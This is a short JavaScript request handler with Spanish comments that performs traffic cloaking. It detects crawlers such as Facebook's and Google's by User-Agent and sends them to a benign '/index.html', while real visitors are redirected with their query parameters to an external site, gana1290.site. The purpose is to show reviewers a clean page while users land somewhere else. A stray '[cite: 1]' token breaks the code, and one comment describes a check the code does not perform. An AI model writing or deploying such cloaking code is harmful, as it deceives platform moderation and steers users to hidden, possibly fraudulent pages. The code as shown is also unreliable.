export default function handler(req, res) {
  // 1. Obtener la IP y el User-Agent del visitante
  const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
  const userAgent = req.headers['user-agent'] || '';
  
  // 2. Extraer parámetros URL correctamente
  const queryParams = new URLSearchParams(req.query || {}).toString();

  // Detección de bots
  const isBotUserAgent = /facebookexternalhit|Facebot|Googlebot|bingbot|Crawler|Puppeteer/i.test(userAgent);
  
  // Si es un bot o no trae parámetros
  if (isBotUserAgent) {
    res.writeHead(302, { Location: '/index.html' });
    return res.end();
  }

  // Redirección si es usuario real
  const destinationBase = 'https://gana1290.site/g50lp2410';[cite: 1]
  const destinationUrl = queryParams ? `${destinationBase}?${queryParams}` : destinationBase;
  
  res.writeHead(302, { Location: destinationUrl });
  return res.end();
}
